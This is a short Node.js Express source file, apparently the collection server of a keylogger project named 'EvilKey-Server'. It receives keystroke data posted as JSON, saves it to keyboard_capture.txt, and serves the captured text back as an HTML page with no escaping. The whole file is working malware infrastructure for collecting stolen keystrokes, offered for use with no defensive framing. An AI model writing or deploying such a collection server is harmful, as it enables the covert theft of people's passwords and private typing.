// import required libarys
const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');

// create a very basic express app
const app = express();

// initialize bodyparser on app to recieve the json from keylogger
app.use(bodyParser.json({extended: true}));
const port = 8080;

// if a get request to the home / '/' ressoure: return basic HTML
// will show up the request logger data == text
app.get("/", (req, res) => {
    try {
        const logger_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf-8', flag:'r'});
        res.send(`<h1>Logged Data</h1><p>${logger_file.replace('\n', '<br>')}</p>`);
    } catch {
        res.send(`<h1>Nothing logged yet.</h1>`)
    }
});


// save the current logged text into a file
app.post("/", (req, res) => {
    // write recieved keylogger data into file
    console.log(req.body.keyboardData);
    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
    res.send(`Successfully send the logger-data`);
});

app.listen(port, () => {
    // send start 
    console.log(`EvilKey-Server is running on localhost(127.0.0.1), port: ${port}`);
});